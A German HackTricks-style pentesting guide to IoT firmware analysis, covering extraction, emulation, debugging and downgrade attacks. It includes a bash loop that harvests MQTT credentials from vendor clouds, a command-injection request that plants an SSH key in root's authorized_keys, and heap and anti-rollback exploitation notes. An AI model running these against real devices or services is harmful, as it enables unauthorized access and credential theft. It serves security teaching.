# Firmware-Analyse

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Einführung**

### Verwandte Ressourcen


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ist essenzielle Software, die den korrekten Betrieb von Geräten ermöglicht, indem sie die Kommunikation zwischen den Hardwarekomponenten und der Software, mit der Benutzer interagieren, verwaltet und erleichtert. Sie ist im permanenten Speicher abgelegt, sodass das Gerät ab dem Einschalten auf wichtige Anweisungen zugreifen kann, was zum Start des Betriebssystems führt. Die Untersuchung und potenzielle Modifizierung der Firmware ist ein wichtiger Schritt zur Identifizierung von Sicherheitslücken.<sup>[[2]](#references)[[3]](#references)</sup>

## **Sammeln von Informationen**

Das **Sammeln von Informationen** ist ein wichtiger erster Schritt, um den Aufbau eines Geräts und die von ihm verwendeten Technologien zu verstehen. Dieser Prozess umfasst das Erfassen von Daten zu:

- Der CPU-Architektur und dem darauf ausgeführten Betriebssystem
- Details zum Bootloader
- Hardwareaufbau und Datenblättern
- Codebasis-Metriken und Speicherorten des Quellcodes
- Externen Bibliotheken und Lizenztypen
- Update-Verläufen und behördlichen Zertifizierungen
- Architektur- und Ablaufdiagrammen
- Sicherheitsbewertungen und identifizierten Sicherheitslücken

Zu diesem Zweck sind **Open-Source-Intelligence (OSINT)**-Tools unverzichtbar, ebenso wie die Analyse aller verfügbaren Open-Source-Softwarekomponenten durch manuelle und automatisierte Prüfprozesse. Tools wie [Coverity Scan](https://scan.coverity.com) und [Semmle’s LGTM](https://lgtm.com/#explore) bieten kostenlose statische Analysen, mit denen potenzielle Probleme gefunden werden können.

## **Beschaffen der Firmware**

Firmware kann auf verschiedene Arten beschafft werden, die jeweils einen eigenen Komplexitätsgrad aufweisen:

- **Direkt** von der Quelle (Entwickler, Hersteller)
- Durch **Erstellen** anhand bereitgestellter Anweisungen
- Durch **Herunterladen** von offiziellen Support-Websites
- Durch die Verwendung von **Google dork**-Abfragen zum Auffinden gehosteter Firmware-Dateien
- Durch den direkten Zugriff auf **Cloud-Speicher** mit Tools wie [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Durch das Abfangen von **Updates** mittels Man-in-the-Middle-Techniken
- Durch das **Extrahieren** vom Gerät über Verbindungen wie **UART**, **JTAG** oder **PICit**
- Durch das **Mitschnüffeln** nach Update-Anfragen innerhalb der Gerätekommunikation
- Durch das Identifizieren und Verwenden von **fest codierten Update-Endpunkten**
- Durch das **Dumping** aus dem Bootloader oder Netzwerk
- Durch das **Entfernen und Auslesen** des Speicherchips, wenn nichts anderes funktioniert, unter Verwendung geeigneter Hardwaretools

### Nur-UART-Logs: Eine Root-Shell über die U-Boot-Umgebungsvariablen im Flash erzwingen

Wenn UART RX ignoriert wird (nur Logs), kannst du trotzdem eine Init-Shell erzwingen, indem du das **U-Boot-Umgebungsblob** offline **bearbeitest**:<sup>[[6]](#references)</sup>

1. Den SPI-Flash mit einem SOIC-8-Clip und Programmer (3,3 V) dumpen:
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Die U-Boot-Env-Partition lokalisieren, `bootargs` so bearbeiten, dass `init=/bin/sh` enthalten ist, und die **U-Boot-Env-CRC32** für das Blob **neu berechnen**.
3. Nur die Env-Partition neu flashen und das Gerät neu starten; auf UART sollte eine Shell erscheinen.

Dies ist bei Embedded-Geräten nützlich, bei denen die Bootloader-Shell deaktiviert ist, die Env-Partition jedoch über einen externen Flash-Zugriff beschreibbar ist.

## Firmware analysieren

Nachdem du nun über die **Firmware verfügst**, musst du Informationen daraus extrahieren, um zu wissen, wie du mit ihr umgehen sollst. Dafür kannst du verschiedene Tools verwenden:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Wenn du mit diesen Tools nicht viel findest, überprüfe die **Entropie** des Images mit `binwalk -E <bin>`. Bei niedriger Entropie ist es wahrscheinlich nicht verschlüsselt. Bei hoher Entropie ist es wahrscheinlich verschlüsselt (oder auf irgendeine Weise komprimiert).

Außerdem kannst du diese Tools verwenden, um **in der Firmware eingebettete Dateien** zu extrahieren:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oder [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), um die Datei zu untersuchen.

### Das Dateisystem erhalten

Mit den zuvor genannten Tools wie `binwalk -ev <bin>` solltest du in der Lage gewesen sein, **das Dateisystem zu extrahieren**.\
Binwalk extrahiert es normalerweise in einem **Ordner, der nach dem Dateisystemtyp benannt ist**. Dies ist üblicherweise einer der folgenden: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuelle Dateisystemextraktion

Manchmal enthält binwalk das **Magic Byte des Dateisystems nicht in seinen Signaturen**. Verwende in diesen Fällen binwalk, um den Offset des Dateisystems zu **finden und das komprimierte Dateisystem** aus der Binärdatei zu **carven** und das Dateisystem anschließend entsprechend seinem Typ anhand der folgenden Schritte **manuell zu extrahieren**.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Führe den folgenden **dd command** zum Carving des Squashfs-Dateisystems aus.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativ kann auch der folgende Befehl ausgeführt werden.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Für squashfs (wie im obigen Beispiel verwendet)

`$ unsquashfs dir.squashfs`

Die Dateien befinden sich anschließend im Verzeichnis "`squashfs-root`".

- CPIO-Archivdateien

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Für jffs2-Dateisysteme

`$ jefferson rootfsfile.jffs2`

- Für ubifs-Dateisysteme mit NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware analysieren

Sobald die Firmware beschafft wurde, ist es wichtig, sie zu zerlegen, um ihre Struktur und potenzielle Schwachstellen zu verstehen. Dieser Prozess umfasst die Verwendung verschiedener Tools zur Analyse und Extraktion wertvoller Daten aus dem Firmware-Image.

### Tools für die erste Analyse

Eine Reihe von Befehlen wird für die erste Untersuchung der Binärdatei (bezeichnet als `<bin>`) bereitgestellt. Diese Befehle helfen dabei, Dateitypen zu identifizieren, Strings zu extrahieren, Binärdaten zu analysieren und die Details von Partitionen und Dateisystemen zu verstehen:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Um den Verschlüsselungsstatus des Images zu beurteilen, wird die **Entropie** mit `binwalk -E <bin>` überprüft. Eine niedrige Entropie deutet auf fehlende Verschlüsselung hin, während eine hohe Entropie auf mögliche Verschlüsselung oder Komprimierung hinweist.

Zum Extrahieren **eingebetteter Dateien** werden Tools und Ressourcen wie die Dokumentation **file-data-carving-recovery-tools** sowie **binvis.io** zur Dateiuntersuchung empfohlen.

### Extrahieren des Dateisystems

Mit `binwalk -ev <bin>` kann man das Dateisystem normalerweise extrahieren, häufig in ein Verzeichnis, das nach dem Dateisystemtyp benannt ist (z. B. squashfs, ubifs). Wenn **binwalk** den Dateisystemtyp aufgrund fehlender Magic Bytes nicht erkennt, ist eine manuelle Extraktion erforderlich. Dazu wird zunächst mit `binwalk` der Offset des Dateisystems ermittelt, anschließend wird das Dateisystem mit dem Befehl `dd` herausgeschnitten:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Anschließend werden je nach Dateisystemtyp (z. B. squashfs, cpio, jffs2, ubifs) unterschiedliche Befehle verwendet, um die Inhalte manuell zu extrahieren.

### Dateisystemanalyse

Nach dem Extrahieren des Dateisystems beginnt die Suche nach Sicherheitslücken. Dabei wird auf unsichere Netzwerk-Daemons, fest codierte Zugangsdaten, API-Endpunkte, Funktionen des Update-Servers, nicht kompilierten Code, Startskripte und kompilierte Binärdateien für die Offline-Analyse geachtet.

**Wichtige Verzeichnisse** und **Elemente**, die untersucht werden sollten, umfassen:

- **etc/shadow** und **etc/passwd** für Benutzerzugangsdaten
- SSL-Zertifikate und Schlüssel in **etc/ssl**
- Konfigurations- und Skriptdateien auf potenzielle Schwachstellen
- Eingebettete Binärdateien für weitere Analysen
- Übliche Webserver und Binärdateien von IoT-Geräten

Mehrere Tools helfen dabei, sensible Informationen und Schwachstellen innerhalb des Dateisystems aufzudecken:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) und [**Firmwalker**](https://github.com/craigz28/firmwalker) zur Suche nach sensiblen Informationen
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) für eine umfassende Firmware-Analyse
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) und [**EMBA**](https://github.com/e-m-b-a/emba) für statische und dynamische Analysen

### Sicherheitsprüfungen an kompilierten Binärdateien

Sowohl der Quellcode als auch die im Dateisystem gefundenen kompilierten Binärdateien müssen sorgfältig auf Schwachstellen untersucht werden. Tools wie **checksec.sh** für Unix-Binärdateien und **PESecurity** für Windows-Binärdateien helfen dabei, ungeschützte Binärdateien zu identifizieren, die ausgenutzt werden könnten.

## Cloud-Konfiguration und MQTT-Zugangsdaten über abgeleitete URL-Tokens erfassen

Viele IoT-Hubs rufen ihre gerätespezifische Konfiguration von einem Cloud-Endpunkt ab, der wie folgt aussieht:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Während der Firmware-Analyse kann sich herausstellen, dass `<token>` lokal aus der Geräte-ID und einem fest codierten Secret abgeleitet wird, zum Beispiel:

- token = MD5( deviceId || STATIC_KEY ) und als Hexadezimalwert in Großbuchstaben dargestellt

Dieses Design ermöglicht es jedem, der eine deviceId und den STATIC_KEY kennt, die URL zu rekonstruieren und die Cloud-Konfiguration abzurufen, wodurch häufig MQTT-Zugangsdaten im Klartext und Topic-Präfixe offengelegt werden.

Praktischer Ablauf:

1) deviceId aus UART-Boot-Logs extrahieren

- Einen 3,3-V-UART-Adapter (TX/RX/GND) anschließen und die Logs aufzeichnen:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Suche nach Zeilen, die das URL-Muster der Cloud-Konfiguration und die Broker-Adresse ausgeben, zum Beispiel:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) STATIC_KEY und den Token-Algorithmus aus der Firmware wiederherstellen

- Binärdateien in Ghidra/radare2 laden und nach dem Konfigurationspfad ("/pf/") oder der MD5-Verwendung suchen.
- Den Algorithmus bestätigen (z. B. MD5(deviceId||STATIC_KEY)).
- Den Token in Bash ableiten und den Digest in Großbuchstaben umwandeln:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Cloud-Konfiguration und MQTT-Credentials ernten

- Die URL zusammensetzen und JSON mit curl abrufen; mit jq parsen, um Secrets zu extrahieren:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Klartext-MQTT und schwache Topic-ACLs missbrauchen (falls vorhanden)

- Verwende die wiederhergestellten Zugangsdaten, um maintenance topics zu abonnieren und nach sensiblen Ereignissen zu suchen:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Vorhersagbare Geräte-IDs enumerieren (in großem Maßstab und mit Genehmigung)

- Viele Ökosysteme enthalten Anbieter-OUI-/Produkt-/Typ-Bytes, gefolgt von einem sequenziellen Suffix.
- Du kannst mögliche IDs iterieren, daraus Tokens ableiten und Configs programmgesteuert abrufen:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notizen
- Hole immer eine ausdrückliche Genehmigung ein, bevor du eine umfassende Enumeration durchführst.
- Bevorzuge nach Möglichkeit Emulation oder statische Analyse, um Secrets wiederherzustellen, ohne die Zielhardware zu verändern.


Der Prozess der Emulation von Firmware ermöglicht eine **dynamische Analyse** entweder des Betriebs eines Geräts oder eines einzelnen Programms. Dieser Ansatz kann auf Herausforderungen durch Hardware- oder Architekturabhängigkeiten stoßen. Das Übertragen des Root-Dateisystems oder bestimmter Binärdateien auf ein Gerät mit passender Architektur und Endianness, beispielsweise einen Raspberry Pi, oder auf eine vorkonfigurierte virtuelle Maschine kann jedoch weitere Tests ermöglichen.

### Emulation einzelner Binärdateien

Bei der Untersuchung einzelner Programme ist es entscheidend, die Endianness und CPU-Architektur des Programms zu bestimmen.

#### Beispiel mit MIPS-Architektur

Um eine Binärdatei mit MIPS-Architektur zu emulieren, kann der folgende Befehl verwendet werden:
```bash
file ./squashfs-root/bin/busybox
```
Und zur Installation der erforderlichen Emulationswerkzeuge:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Für MIPS (Big-Endian) wird `qemu-mips` verwendet, und für Little-Endian-Binaries wäre `qemu-mipsel` die richtige Wahl.

#### Emulation der ARM-Architektur

Für ARM-Binaries ist der Prozess ähnlich, wobei der `qemu-arm`-Emulator für die Emulation verwendet wird.

### Vollständige Systememulation

Tools wie [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) und andere ermöglichen die vollständige Firmware-Emulation, automatisieren den Prozess und unterstützen die dynamische Analyse.

## Dynamische Analyse in der Praxis

In dieser Phase wird entweder eine reale oder eine emulierte Geräteumgebung für die Analyse verwendet. Es ist wichtig, den Shell-Zugriff auf das Betriebssystem und das Dateisystem aufrechtzuerhalten. Die Emulation bildet Hardware-Interaktionen möglicherweise nicht perfekt nach, weshalb gelegentliche Neustarts der Emulation erforderlich sein können. Bei der Analyse sollten das Dateisystem erneut untersucht, exponierte Webseiten und Netzwerkdienste ausgenutzt und Schwachstellen im Bootloader untersucht werden. Firmware-Integritätstests sind entscheidend, um potenzielle Backdoor-Schwachstellen zu identifizieren.

## Techniken der Laufzeitanalyse

Bei der Laufzeitanalyse wird mit einem Prozess oder Binary in dessen Betriebsumgebung interagiert. Dazu werden Tools wie gdb-multiarch, Frida und Ghidra verwendet, um Breakpoints zu setzen und durch Fuzzing sowie andere Techniken Schwachstellen zu identifizieren.

Für Embedded-Ziele ohne vollständigen Debugger **kopiere einen statisch gelinkten `gdbserver`** auf das Gerät und stelle remote eine Verbindung her:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee-/Funk-Co-Prozessor-Nachrichten-Mapping

Bei IoT-Hubs ist der RF-Stack häufig zwischen einem **Radio-MCU** und einem Linux-Userland-Prozess aufgeteilt. Ein nützlicher Workflow besteht darin, den Pfad abzubilden:<sup>[[8]](#references)</sup>

1. **RF-Frame** über Funk
2. **Controller-seitiger Parser** auf dem Radio-MCU
3. **Serielles/UART-Text- oder TLV-Protokoll**, das an Linux weitergeleitet wird (zum Beispiel `/dev/tty*`)
4. **Application-Dispatcher** im Haupt-Daemon
5. **Protokollspezifischer Handler / State Machine**

Diese Architektur erzeugt zwei Reverse-Engineering-Ziele statt eines. Wenn der Controller binäre Funk-Frames in ein Textprotokoll wie `Group,Command,arg1,arg2,...` umwandelt, ermittle:

- Die **Message-Gruppen** und Dispatch-Tabellen
- Welche Nachrichten aus dem **Netzwerk** beziehungsweise vom Controller selbst stammen können
- Die genauen **herstellerspezifischen Discriminator-Felder** (zum Beispiel Zigbee `manufacturer_code` und `cluster_command`)
- Welche Handler nur während **Commissioning**, Discovery oder Firmware-/Modell-Download-Phasen erreichbar sind

Für Zigbee solltest du den Pairing-Datenverkehr mitschneiden und prüfen, ob das Ziel weiterhin den standardmäßigen **Link Key** `ZigBeeAlliance09` verwendet. Falls ja, kann das Mitschneiden des Commissioning-Datenverkehrs den **Network Key** offenlegen. Zigbee-3.0-Install-Codes reduzieren diese Angriffsfläche. Notiere daher, ob das getestete Gerät sie tatsächlich erzwingt.

### Herstellerspezifische Protokoll-Handler und FSM-gesteuerte Erreichbarkeit

Herstellerspezifische Zigbee-/ZCL-Befehle sind oft ein besseres Ziel als standardisierte Cluster, da sie **kundenspezifischen Parsing-Code** und interne **FSMs** mit weniger praxiserprobter Validierung erreichen.<sup>[[8]](#references)</sup>

Praktischer Workflow:

- Reverse den Command-Dispatcher, bis du den **reinen Vendor-Handler** findest.
- Rekonstruiere die Tabellen für **FSM-Status**, **Event**, **Check**, **Action** und **Next-State**.
- Identifiziere **transitional states**, die automatisch fortschreiten, sowie Retry-/Error-Zweige, die schließlich von Angreifern kontrollierten Zustand zurücksetzen oder freigeben.
- Bestätige, welche legitimen Protokollaustausche erforderlich sind, um den Daemon in den verwundbaren Zustand zu versetzen, statt anzunehmen, dass der fehlerhafte Handler immer erreichbar ist.

Bei zeitkritischen Protokollen kann das Packet-Replay aus einem Python-Framework zu langsam sein. Zuverlässiger ist es, ein legitimes Gerät auf echter Hardware (zum Beispiel einem **nRF52840**) mit einem Vendor-Grade-Stack zu emulieren, damit die korrekten **Endpoints**, **Attributes** und das Commissioning-Timing bereitgestellt werden.

### Fehlerklasse fragmentierter Downloads in Embedded-Daemons

Eine wiederkehrende Firmware-Fehlerklasse tritt bei **fragmentierten Blob-/Modell-/Konfigurations-Downloads** auf:<sup>[[8]](#references)</sup>

1. Das **erste Fragment** (`offset == 0`) speichert `ctx->total_size` und reserviert `malloc(total_size)`.
2. Spätere Fragmente validieren nur die vom Angreifer kontrollierten **Paket-lokalen** Felder wie `packet_total_size >= offset + chunk_len`.
3. Die Kopie verwendet `memcpy(&ctx->buffer[offset], chunk, chunk_len)`, ohne sie gegen die **ursprünglich reservierte Größe** zu prüfen.

Dadurch kann ein Angreifer Folgendes senden:

- Ein erstes gültiges Fragment mit einer **kleinen** angegebenen Gesamtgröße, um eine kleine Heap-Allokation zu erzwingen.
- Ein späteres Fragment mit dem **erwarteten Offset**, aber einem größeren `chunk_len`.
- Eine gefälschte paketlokale Größe, die die neuen Prüfungen erfüllt und trotzdem den ursprünglich reservierten Buffer überlaufen lässt.

Wenn der verwundbare Pfad hinter Commissioning-Logik liegt, muss die Ausnutzung genügend **Geräteemulation** enthalten, um das Ziel vor dem Senden der fehlerhaften Fragmente in den erwarteten Modell-Download- oder Blob-Download-Zustand zu bringen.

### Durch Protokoll ausgelöste `free()`-Trigger

Bei Embedded-Daemons lässt sich Heap-Metadata-Exploitation oft nicht am einfachsten durch „auf das Cleanup warten“, sondern durch das **Erzwingen der protokolleigenen Fehlerbehandlung** auslösen:<sup>[[8]](#references)</sup>

- Sende fehlerhafte Folgefragmente, um die FSM in **Retry-** oder **Error-States** zu bringen.
- Überschreite den Retry-Schwellenwert, sodass der Daemon den **Kontext zurücksetzt** und den beschädigten Buffer freigibt.
- Verwende dieses vorhersehbare `free()`, um Allocator-seitige Primitives auszulösen, bevor der Prozess aus anderen Gründen abstürzt.

Dies ist besonders nützlich gegen **musl-/uClibc-/dlmalloc-ähnliche** Allocators in Embedded Linux, bei denen die Beschädigung von Chunk-Metadaten die Unlink-/Unbin-Logik in ein Write-Primitive verwandeln kann. Ein stabiles Muster besteht darin, ein **Size-Feld** zu beschädigen, um die Traversierung des Allocators auf **Fake-Chunks innerhalb des überlaufenen Buffers** umzulenken, statt sofort reale Bin-Pointer zu überschreiben und den Prozess zum Absturz zu bringen.

## Binary Exploitation und Proof-of-Concept

Die Entwicklung eines PoC für identifizierte Schwachstellen erfordert ein tiefes Verständnis der Zielarchitektur und die Programmierung in Low-Level-Sprachen. Binäre Laufzeitschutzmechanismen sind in Embedded-Systemen selten. Wenn sie jedoch vorhanden sind, können Techniken wie Return Oriented Programming (ROP) erforderlich sein.

### Hinweise zur uClibc-Fastbin-Exploitation (Embedded Linux)

- **Fastbins + Konsolidierung:** uClibc verwendet Fastbins ähnlich wie glibc. Eine spätere große Allokation kann `__malloc_consolidate()` auslösen. Daher muss jeder Fake-Chunk Prüfungen überstehen (sinnvolle Größe, `fd = 0` und umgebende Chunks, die als „in use“ erkannt werden).<sup>[[6]](#references)</sup>
- **Nicht-PIE-Binaries unter ASLR:** Wenn ASLR aktiviert ist, das Haupt-Binary aber **non-PIE** ist, sind Adressen innerhalb von `.data/.bss` stabil. Du kannst einen Bereich anvisieren, der bereits einem gültigen Heap-Chunk-Header ähnelt, um eine Fastbin-Allokation auf eine **Function-Pointer-Tabelle** zu lenken.
- **Parser-stoppendes NUL:** Beim Parsen von JSON kann ein `\x00` im Payload das Parsen stoppen und gleichzeitig nachfolgende, vom Angreifer kontrollierte Bytes für einen Stack-Pivot-/ROP-Chain erhalten.
- **Shellcode über `/proc/self/mem`:** Eine ROP-Chain, die `open("/proc/self/mem")`, `lseek()` und `write()` aufruft, kann ausführbaren Shellcode in einem bekannten Mapping platzieren und dorthin springen.

## Vorbereitete Betriebssysteme für Firmware-Analyse

Betriebssysteme wie [AttifyOS](https://github.com/adi0x90/attifyos) und [EmbedOS](https://github.com/scriptingxss/EmbedOS) stellen vorkonfigurierte Umgebungen für Firmware-Security-Testing bereit, die mit den erforderlichen Tools ausgestattet sind.

## Vorbereitete Betriebssysteme zur Firmware-Analyse

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ist eine Distro, die dich bei der Durchführung von Security Assessments und Penetrationstests von Internet-of-Things-(IoT-)Geräten unterstützt. Sie spart viel Zeit, da sie eine vorkonfigurierte Umgebung mit allen erforderlichen Tools bereitstellt.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Auf Ubuntu 18.04 basierendes Betriebssystem für Embedded-Security-Testing, das mit Tools für Firmware-Security-Testing vorinstalliert ist.

## Firmware-Downgrade-Angriffe und unsichere Update-Mechanismen

Selbst wenn ein Hersteller kryptografische Signaturprüfungen für Firmware-Images implementiert, fehlt häufig der **Schutz vor Versions-Rollback (Downgrade)**. Wenn der Boot- oder Recovery-Loader die Signatur nur mit einem eingebetteten Public Key verifiziert, aber nicht die *Version* (oder einen monotonen Zähler) des zu flashenden Images vergleicht, kann ein Angreifer **ältere, verwundbare Firmware mit weiterhin gültiger Signatur** legitim installieren und dadurch bereits gepatchte Schwachstellen erneut einführen.<sup>[[4]](#references)</sup>

Typischer Angriffsablauf:

1. **Beschaffe ein älteres signiertes Image**
* Lade es aus dem öffentlichen Download-Portal, CDN oder von der Support-Website des Herstellers herunter.
* Extrahiere es aus zugehörigen Mobile-/Desktop-Anwendungen (zum Beispiel innerhalb eines Android-APKs unter `assets/firmware/`).
* Beziehe es aus Drittanbieter-Repositories wie VirusTotal, Internet-Archiven, Foren usw.
2. **Lade das Image über einen exponierten Update-Kanal auf das Gerät hoch oder stelle es darüber bereit:**
* Web-UI, Mobile-App-API, USB, TFTP, MQTT usw.
* Viele Consumer-IoT-Geräte stellen *nicht authentifizierte* HTTP(S)-Endpoints bereit, die Base64-kodierte Firmware-Blobs akzeptieren, serverseitig decodieren und Recovery/Upgrade auslösen.
3. Exploite nach dem Downgrade eine Schwachstelle, die im neueren Release gepatcht wurde (zum Beispiel einen Command-Injection-Filter, der später hinzugefügt wurde).
4. Flashe optional wieder das aktuelle Image oder deaktiviere Updates, um nach erfolgreicher Persistence eine Entdeckung zu vermeiden.

### Beispiel: Command Injection nach einem Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
In der verwundbaren (downgradeten) Firmware wird der Parameter `md5` ohne Bereinigung direkt in einen Shell-Befehl eingefügt, wodurch die Injection beliebiger Befehle möglich ist (hier zur Aktivierung des SSH-Schlüssel-basierten Root-Zugriffs). Spätere Firmware-Versionen führten einen einfachen Zeichenfilter ein, aber das Fehlen eines Downgrade-Schutzes macht die Behebung wirkungslos.<sup>[[4]](#references)</sup>

### Firmware aus mobilen Apps extrahieren

Viele Anbieter bündeln vollständige Firmware-Images in ihren zugehörigen mobilen Anwendungen, damit die App das Gerät über Bluetooth/Wi-Fi aktualisieren kann. Diese Pakete werden üblicherweise unverschlüsselt im APK/APEX unter Pfaden wie `assets/fw/` oder `res/raw/` gespeichert. Tools wie `apktool`, `ghidra` oder sogar einfaches `unzip` ermöglichen es, signierte Images zu extrahieren, ohne die physische Hardware zu berühren.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Nur im Updater implementierter Anti-Rollback-Bypass in A/B-Slot-Designs

Einige Anbieter implementieren zwar ein Anti-Downgrade-**Ratchet**, jedoch nur innerhalb der *Updater*-Logik (zum Beispiel eine UDS-Routine über CAN, einen Recovery-Befehl oder einen OTA-Agent im Userspace). Wenn der **Bootloader** später nur die Signatur/CRC des Images prüft und der Partitionstabelle oder den Slot-Metadaten vertraut, kann der Rollback-Schutz dennoch umgangen werden.<sup>[[7]](#references)</sup>

Typisches schwaches Design:

- Die Firmware-Metadaten enthalten sowohl einen Versionsdeskriptor als auch einen **Sicherheits-Ratchet** / monotonen Zähler.
- Der Updater vergleicht den Image-Ratchet mit einem Wert im persistenten Speicher und weist ältere signierte Images zurück.
- Der Bootloader **interpretiert** diesen Ratchet nicht und prüft vor dem Booten des ausgewählten Slots nur Header, CRC und Signatur.
- Die Slot-Aktivierung wird separat in einer Partitionstabelle oder einem Generation Counter pro Slot gespeichert und ist **nicht kryptografisch** an den exakten Firmware-Digest gebunden, der validiert wurde.

Dadurch entsteht in Dual-Slot-Systemen ein Primitive zum **Validieren eines Images / Booten eines anderen Images**. Wenn der Angreifer den Updater dazu bringen kann, Slot B mithilfe eines aktuell signierten Images als nächstes Bootziel zu markieren, und Slot B anschließend vor dem Reboot überschreiben kann, bootet der Bootloader möglicherweise trotzdem das downgradete Image, weil er nur den bereits festgeschriebenen Slot-Metadaten vertraut.

Typisches Missbrauchsmuster:

1. Eine **aktuelle signierte** Firmware in den passiven Slot hochladen und die normale Validierungs-/Switch-Routine ausführen, sodass das Layout diesen Slot als nächsten aktiven Slot markiert.
2. **Noch nicht rebooten**. In derselben Session erneut die Slot-Vorbereitungs-/Löschroutine aufrufen.
3. Veraltete Boot-State- oder Slot-Auswahllogik ausnutzen, sodass der Updater den **selben physischen Slot** löscht, der gerade aktiviert wurde.
4. Eine **ältere, aber weiterhin signierte** Firmware in diesen Slot schreiben.
5. Die Validierungsroutine überspringen, die den Ratchet erzwingt, und direkt rebooten.
6. Der Bootloader wählt den aktivierten Slot aus, prüft nur Signatur/Integrität und bootet das alte Image.

Beim Reverse Engineering von A/B-Update-Implementierungen sollte man nach Folgendem suchen:

- Slot-Auswahl, die aus **Boot-Time-Flags** abgeleitet wird, die nach einem erfolgreichen Switch nicht aktualisiert werden.
- Einer `prepare_passive_slot()`-ähnlichen Routine, die einen Slot anhand veralteten Zustands statt anhand des **aktuell festgeschriebenen Layouts** löscht.
- Einer `part_write_layout()`-ähnlichen Funktion, die nur einen **Generation Counter** / ein Aktiv-Flag erhöht und den Hash des validierten Images nicht speichert.
- Ratchet-Prüfungen, die im Userspace oder Updater-Code implementiert sind, aber **nicht** in ROM-/Bootloader-/Secure-Boot-Stufen.
- Lösch- oder Recovery-Routinen, die den Slot weiterhin als bootfähig markieren, nachdem sein Inhalt entfernt und neu geschrieben wurde.

### Checkliste zur Bewertung der Update-Logik

